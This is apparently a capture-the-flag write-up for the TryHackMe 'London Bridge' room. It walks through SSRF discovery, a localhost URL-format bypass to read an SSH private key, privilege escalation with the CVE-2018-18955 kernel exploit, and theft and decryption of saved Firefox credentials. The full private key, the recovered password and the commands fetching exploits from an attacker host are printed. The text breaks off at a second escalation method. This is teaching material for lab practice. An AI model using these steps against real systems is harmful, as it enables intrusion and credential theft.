# TryHackMe-London Bridge

**Scope:**

- HTTP Tampering
- SSRF (Server-Side Request Forgery)
- URL Format Bypass
- UID (User Identifier)
- GID (Group Identifier)

**Keywords:**

- feroxbuster
- HTTP Tampering Methods
- File Transfer Phase
- POST Parameter Fuzzing
- URL Format Bypass
- SSH Connection with ID RSA
- LinPEAS
- Linux Kernel Exploit
- CVE-2018-18955
- Firefox Credentials
- Compress Firefox Files
- Decryption Firefox Credentials
- Web Server Manipulation
- Python Script Analysis

**Main Commands:**

- `nmap -sS -sV -sC -T4 -A -oN nmap_result.txt -Pn $target_ip`
- `wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt --hc 403,404,500,501,502,503 -c -t 50 http://londonbridge.thm:8080/FUZZ`
- `nmap -sV -T4 -A -p 8080 --script=http-enum -oN nmap_http_enum_result.txt -Pn $target_ip`
- `ffuf -u 'http://londonbridge.thm:8080/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -ic -t 50 -fs 232`
- `feroxbuster -u 'http://londonbridge.thm:8080' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o ferox_dir_result.txt -t 20 -r -s 200,403,405 --random-agent`
- `curl -iLX GET -D getresponse.txt http://londonbridge.thm:8080/view_image`
- `python3 -m http.server 8000`
- `curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'image_url=http://10.2.37.37:8000/injectfile' -D ssrftestresult.txt $'http://londonbridge.thm:8080/view_image'`
- `wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H "Content-Type: application/x-www-form-urlencoded" -X POST -d 'FUZZ=http://10.2.37.37:8000/injectfile' -u http://londonbridge.thm:8080/view_image --hc 403,404,500,501,502,503 --hh 823`
- `ffuf -u 'http://londonbridge.thm:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.2.37.37:8000/injectfile' -mc all -t 30 -ic -fs 823`
- `curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'www=http://10.2.37.37:8000/injectfile' -D wwwssrftestresult.txt $'http://londonbridge.thm:8080/view_image'`
- `curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'www=http://127.0.0.1' $'http://londonbridge.thm:8080/view_image'`
- `ffuf -u 'http://londonbridge.thm:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.1/FUZZ' -mc all -t 30 -ic -fs 469`
- `curl -s -X $'POST' --data-binary $'www=http://127.1/.ssh/id_rsa' $'http://londonbridge.thm:8080/view_image' -o id_rsa`
- `chmod 600 id_rsa`
- `ssh -i id_rsa -o MACs=hmac-sha2-256 beth@londonbridge.thm -p 22`
- `wget https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/linpeas_linux_amd64`
- `scp -o MACs=hmac-sha2-256 -i id_rsa beth@londonbridge.thm:/tmp/firefox.tar.gz .`
- `tar -xvzf firefox.tar.gz`
- `sudo chmod -R 777 firefox`
- `python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles`

**System Commands:**

- `uname -a`
- `dpkg --version`
- `chmod +x linpeas64`
- `./linpeas64`
- `bash exploit.dbus.sh`
- `tar -cvzf /tmp/firefox.tar.gz firefox`
- `ps -aux | grep 'gunicorn’`
- `ln -s /etc uploads`
- `gcc -fPIC -shared -o /tmp/exp2.so /tmp/exp2.c -nostartfiles`
- `ping -c 1 127.0.0.1`
- `/bin/bash -p`

### Laboratory Environment

[The London Bridge](https://tryhackme.com/r/room/thelondonbridge)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sS -sV -sC -T4 -A -oN nmap_result.txt -Pn $target_ip`

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http-proxy gunicorn
|_http-title: Explore London
|_http-server-header: gunicorn
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 02 Oct 2024 05:39:59 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Explore London</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #f2f2f2;
|     header {
|     background-color: #333;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     background-color: #444;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     color: #fff;
|     text-decoration: none;
|     margin: 0 10p
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 02 Oct 2024 05:39:59 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|_    Content-Length: 0
```

> **HTTP Port Check**
> 

`curl -iLX GET http://londonbridge.thm:8080`

```bash
[REDACTED] - MORE

</head>
<body>
    <header>
        <h1>Welcome to Explore London</h1>
    </header>
    <nav>
        <a href="/">Home</a>
        <a href="#">Attractions</a>
        <a href="#">Events</a>
        <a href="/gallery">Gallery</a>
        <a href="/contact">Contact</a>
    </nav>
    <div class="container">
        <div class="main-content">
            <h2>About London</h2>
            <p>London, the capital of England and the United Kingdom, is a 21st-century city with history stretching back to Roman times. At its centre stand the imposing Houses of Parliament, the iconic ‘Big Ben’ clock tower and Westminster Abbey, site of British monarch coronations. Across the Thames River, the London Eye observation wheel provides panoramic views of the South Bank cultural complex, and the entire city.</p>
            <h2>Explore Attractions</h2>
            <p>London offers a wide range of attractions including the British Museum, the Tower of London, Buckingham Palace, the London Eye, and many more.</p>
            <h2>Upcoming Events</h2>
            <p>London hosts various events throughout the year including festivals, concerts, exhibitions, and sporting events.</p>
        </div>
    </div>
    <footer>
        <p>&copy; 2024 Explore London</p>
    </footer>
</body>
</html>

[REDACTED] - MORE
```

> **Endpoint Checking Phase**
> 

`curl -iLX GET http://londonbridge.thm:8080/gallery`

```bash
[REDACTED] - MORE

</head>
<body>
    <h1>London Gallery</h1>
    <div class="container">
        
            <img class="image" src="/uploads/www.usnews.jpeg" alt="www.usnews.jpeg">
        
            <img class="image" src="/uploads/04.jpg" alt="04.jpg">
        
            <img class="image" src="/uploads/Untitled.png" alt="Untitled.png">
        
            <img class="image" src="/uploads/images.jpeg" alt="images.jpeg">
        
            <img class="image" src="/uploads/e3.jpg" alt="e3.jpg">
        
            <img class="image" src="/uploads/caption.jpg" alt="caption.jpg">
        
            <img class="image" src="/uploads/Thames.jpg" alt="Thames.jpg">
        
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>

[REDACTED] - MORE

```

> **Path Traversal & Directory Discovery Phase**
> 

`wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt --hc 403,404,500,501,502,503 -c -t 50 http://londonbridge.thm:8080/FUZZ`

```bash
000000036:   200        59 L     127 W      1703 Ch     "contact"                                                                        
000000143:   405        4 L      23 W       178 Ch      "upload"                                                                         
000000157:   200        54 L     125 W      1722 Ch     "gallery"                                                                        
000000286:   405        4 L      23 W       178 Ch      "feedback"                                                                       
000015879:   405        4 L      23 W       178 Ch      "view_image"

[REDACTED] - MORE
```

`nmap -sV -T4 -A -p 8080 --script=http-enum -oN nmap_http_enum_result.txt -Pn $target_ip`

```bash
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy gunicorn
|_http-server-header: gunicorn
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 02 Oct 2024 05:46:44 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Explore London</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #f2f2f2;
|     header {
|     background-color: #333;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     background-color: #444;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     color: #fff;
|     text-decoration: none;
|     margin: 0 10p
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 02 Oct 2024 05:46:45 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|_    Content-Length: 0
```

`ffuf -u 'http://londonbridge.thm:8080/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -ic -t 50 -fs 232`

```bash
contact                 [Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 363ms]
upload                  [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 341ms]
gallery                 [Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 329ms]
feedback                [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 326ms]
view_image              [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 329ms]
```

`feroxbuster -u 'http://londonbridge.thm:8080' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o ferox_dir_result.txt -t 20 -r -s 200,403,405 --random-agent`

```bash
200      GET       59l      127w     1703c http://londonbridge.thm:8080/contact
200      GET       54l      125w     1722c http://londonbridge.thm:8080/gallery
200      GET       82l      256w     2682c http://londonbridge.thm:8080/
405      GET        4l       23w      178c http://londonbridge.thm:8080/feedback
405      GET        4l       23w      178c http://londonbridge.thm:8080/upload
200      GET       57l      319w    27009c http://londonbridge.thm:8080/uploads/images.jpeg
200      GET      230l     1199w    97517c http://londonbridge.thm:8080/uploads/caption.jpg
200      GET      363l     1894w   151239c http://londonbridge.thm:8080/uploads/e3.jpg
200      GET      286l     1579w   125448c http://londonbridge.thm:8080/uploads/04.jpg
200      GET      344l     1947w   168990c http://londonbridge.thm:8080/uploads/www.usnews.jpeg
200      GET     2242l     8558w   712812c http://londonbridge.thm:8080/uploads/Thames.jpg
200      GET     6116l    36096w  2841008c http://londonbridge.thm:8080/uploads/Untitled.png

[REDACTED] - MORE
```

> **HTTP Tampering Phase**
> 

`curl -iLX GET -D getresponse.txt http://londonbridge.thm:8080/view_image`

```bash
HTTP/1.1 405 METHOD NOT ALLOWED
Server: gunicorn
Date: Wed, 02 Oct 2024 05:54:40 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 178

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

`curl -iLX POST -D postresponse.txt http://londonbridge.thm:8080/view_image`

```bash
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 02 Oct 2024 05:55:18 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 823

</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    

</body>
</html>
```

> **SSRF (Server-Side Request Forgery) Phase**
> 

`echo 'hello_world' > injectfile`

`python3 -m http.server 8000`

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'image_url=http://10.2.37.37:8000/injectfile' -D ssrftestresult.txt $'http://londonbridge.thm:8080/view_image'`

```bash
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 02 Oct 2024 06:07:36 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 900

</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="http://10.2.37.37:8000/injectfile" alt="User provided image">

</body>
</html>
```

`wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H "Content-Type: application/x-www-form-urlencoded" -X POST -d 'FUZZ=http://10.2.37.37:8000/injectfile' -u http://londonbridge.thm:8080/view_image --hc 403,404,500,501,502,503 --hh 823`

```bash
000000536:   200        1 L      1 W        12 Ch       "www"
```

```bash
10.10.32.116 - - [02/Oct/2024 02:12:36] "GET /injectfile HTTP/1.1" 200 -
10.10.32.116 - - [02/Oct/2024 02:13:38] "GET /injectfile HTTP/1.1" 200 -
10.10.32.116 - - [02/Oct/2024 02:15:23] "GET /injectfile HTTP/1.1" 200 -
```

`ffuf -u 'http://londonbridge.thm:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.2.37.37:8000/injectfile' -mc all -t 30 -ic -fs 823`

```bash
www                     [Status: 200, Size: 12, Words: 1, Lines: 2, Duration: 986ms]
```

`curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'www=http://10.2.37.37:8000/injectfile' -D wwwssrftestresult.txt $'http://londonbridge.thm:8080/view_image'`

```bash
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 02 Oct 2024 06:16:12 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 12

hello_world
```

> **Internal Service Enumeration with URL Format Bypass**
> 

**For more information:**

[URL Format Bypass | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)

`curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'www=http://127.0.0.1' $'http://londonbridge.thm:8080/view_image'`

```bash
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Wed, 02 Oct 2024 06:18:09 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 239

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>

```

`curl -iL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'www=http://127.1/' $'http://londonbridge.thm:8080/view_image'`

```bash
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 02 Oct 2024 06:18:40 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 1270

<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    Build it up with iron bars<br>
    Iron bars, iron bars<br>
    Build it up with iron bars<br>
    My fair lady<br>
    Iron bars will bend and break<br>
    Bend and break, bend and break<br>
    Iron bars will bend and break<br>
    My fair lady<br>
<img height=400px width=600px src="static/2.webp"><br>
<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
    Gold and silver, gold and silver<br>
    Build it up with gold and silver<br>
    My fair lady<br>
    Gold and silver we've not got<br>
    We've not got, we've not got<br>
    Gold and silver we've not got<br>
    My fair lady<br>
<img height=400px width=600px src="static/3.jpg"><br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair beth</font>
</body>
</HTML>

```

`ffuf -u 'http://londonbridge.thm:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.1/FUZZ' -mc all -t 30 -ic -fs 469`

```bash
templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 384ms]
uploads                 [Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 399ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 373ms]
.                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 358ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 336ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 336ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 336ms]
```

> **Gathering Internal Files with SSRF**
> 

`curl -s -X $'POST' --data-binary $'www=http://127.1/.ssh/id_rsa' $'http://londonbridge.thm:8080/view_image' -o id_rsa`

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```

`curl -s -X $'POST' --data-binary $'www=http://127.1/.ssh/authorized_keys' $'http://londonbridge.thm:8080/view_image' -o authorized_keys`

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

> **SSH Connection & System Information Phase**
> 

`chmod 600 id_rsa`

`ssh -i id_rsa -o MACs=hmac-sha2-256 beth@londonbridge.thm -p 22`

```bash
beth@london:~$ whoami
beth
beth@london:~$ id
uid=1000(beth) gid=1000(beth) groups=1000(beth)
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
beth@london:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.
beth@london:~$ ls -lsa __pycache__
total 20
4 drwxrwxr-x  2 beth beth 4096 Apr 23 22:15 .
4 drwxr-xr-x 11 beth beth 4096 May  7 06:36 ..
4 -rw-rw-r--  1 beth beth 3209 Apr 17 03:46 app.cpython-36.pyc
4 -rw-rw-r--  1 beth beth  375 Apr 17 04:03 gunicorn_config.cpython-36.pyc
4 -rw-r--r--  1 root root   25 Apr 23 22:15 user.txt
beth@london:~$ 
```

> **System Exploit Enumeration & LinPEAS Phase**
> 

`wget https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/linpeas_linux_amd64`

```bash
linpeas_linux_amd64                  100%[====================================================================>]   3.10M  4.25MB/s    in 0.7s    

2024-10-02 02:58:16 (4.25 MB/s) - ‘linpeas_linux_amd64’ saved [3256264/3256264]
```

```bash
beth@london:~$ wget http://10.2.37.37:8000/linpeas_linux_amd64 -O linpeas64
--2024-10-01 23:57:18--  http://10.2.37.37:8000/linpeas_linux_amd64
Connecting to 10.2.37.37:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3256264 (3.1M) [application/octet-stream]
Saving to: ‘linpeas64’

linpeas64                            100%[====================================================================>]   3.10M   854KB/s    in 5.8s    

2024-10-01 23:57:25 (544 KB/s) - ‘linpeas64’ saved [3256264/3256264]

beth@london:~$ chmod +x linpeas64
beth@london:~$ ./linpeas64

[REDACTED] - MORE

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                           
    |---------------------------------------------------------------------------------|                                                           
    |         Follow on Twitter         :     @hacktricks_live                        |                                                           
    |         Respect on HTB            :     SirBroccoli                             |                                                           
    |---------------------------------------------------------------------------------|                                                           
    |                                 Thank you!                                      |                                                           
    \---------------------------------------------------------------------------------/                                                           
          linpeas-ng by github.com/PEASS-ng 
          
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
   
[REDACTED] - MORE

beth@london:~$
```

**For LinPEAS source:**

[https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/linpeas_linux_amd64](https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/linpeas_linux_amd64)

> **Privilege Escalation with Linux Kernel Exploit**
> 

**For more informations:**

[NVD - CVE-2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955)

[Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method)](https://www.exploit-db.com/exploits/47166)

`ls | grep '.sh'`

```bash
exploit.dbus.sh
rootshell.c
subshell.c
subuid_shell.c
```

**For script source:**

[kernel-exploits/CVE-2018-18955 at master · bcoles/kernel-exploits](https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955)

```bash
beth@london:~$ mkdir /tmp/exp
beth@london:~$ cd /tmp/exp
beth@london:/tmp/exp$ wget http://10.2.37.37:8000/exploit.dbus.sh -O exploit.dbus.sh
exploit.dbus.sh                      100%[====================================================================>]   3.74K  --.-KB/s    in 0.004s  

2024-10-02 00:06:13 (961 KB/s) - ‘exploit.dbus.sh’ saved [3829/3829]

beth@london:/tmp/exp$ wget http://10.2.37.37:8000/rootshell.c -O rootshell.c
rootshell.c                          100%[====================================================================>]     143  --.-KB/s    in 0s      

2024-10-02 00:06:30 (20.4 MB/s) - ‘rootshell.c’ saved [143/143]

beth@london:/tmp/exp$ wget http://10.2.37.37:8000/subshell.c -O subshell.c
subshell.c                           100%[====================================================================>]   1.57K  --.-KB/s    in 0.001s  

2024-10-02 00:06:46 (1.23 MB/s) - ‘subshell.c’ saved [1604/1604]

beth@london:/tmp/exp$ wget http://10.2.37.37:8000/subuid_shell.c -O subuid_shell.c
subuid_shell.c                       100%[====================================================================>]   5.92K  --.-KB/s    in 0.007s  

2024-10-02 00:07:02 (862 KB/s) - ‘subuid_shell.c’ saved [6065/6065]

beth@london:/tmp/exp$ bash exploit.dbus.sh
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Oct  2 00:08 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:/tmp/exp# whoami
root
root@london:/tmp/exp# pwd
/tmp/exp
root@london:/tmp/exp# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
root@london:/tmp/exp# 
```

> **Compress Firefox Files**
> 

```bash
root@london:/tmp/exp# ls -lsa /home/charles/.mozilla/firefox
total 12
4 drw-------  3 charles charles 4096 Mar 16  2024 .
4 drw-------  3 charles charles 4096 Mar 16  2024 ..
4 drw------- 16 charles beth    4096 Mar 16  2024 8k3bf3zp.charles
root@london:/tmp/exp# cd /home/charles/.mozilla/
root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
firefox/
firefox/8k3bf3zp.charles/
firefox/8k3bf3zp.charles/storage-sync-v2.sqlite
firefox/8k3bf3zp.charles/safebrowsing/
firefox/8k3bf3zp.charles/safebrowsing/google4/
firefox/8k3bf3zp.charles/extensions.json
firefox/8k3bf3zp.charles/extension-store/
firefox/8k3bf3zp.charles/sessionstore-backups/
firefox/8k3bf3zp.charles/sessionstore-backups/previous.jsonlz4
firefox/8k3bf3zp.charles/sessionstore-backups/upgrade.jsonlz4-20240115170312
firefox/8k3bf3zp.charles/logins-backup.json
firefox/8k3bf3zp.charles/containers.json

[REDACTED] - MORE

root@london:/home/charles/.mozilla#
```

> **SSH File Transfer Phase**
> 

`scp -o MACs=hmac-sha2-256 -i id_rsa beth@londonbridge.thm:/tmp/firefox.tar.gz .`

```bash
firefox.tar.gz   100%   14MB 671.3KB/s   00:22 
```

> **Decryption Firefox Credentials**
> 

`tar -xvzf firefox.tar.gz`

```bash
firefox/
firefox/8k3bf3zp.charles/
firefox/8k3bf3zp.charles/storage-sync-v2.sqlite
firefox/8k3bf3zp.charles/safebrowsing/
firefox/8k3bf3zp.charles/safebrowsing/google4/
firefox/8k3bf3zp.charles/extensions.json
firefox/8k3bf3zp.charles/extension-store/
firefox/8k3bf3zp.charles/sessionstore-backups/

[REDACTED] - MORE
```

`sudo chmod -R 777 firefox`

`python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles`

```bash
Username: 'Charles'
Password: 'thekingofengland'
```

**For script source:**

[https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)

> **Another Method for Privilege Escalation**
> 

```bash
beth@london:~$ ps -aux | grep 'gunicorn'
root       439  0.0  1.1  75640 22212 ?        Ss   Oct01   0:01 /usr/bin/python3 /home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
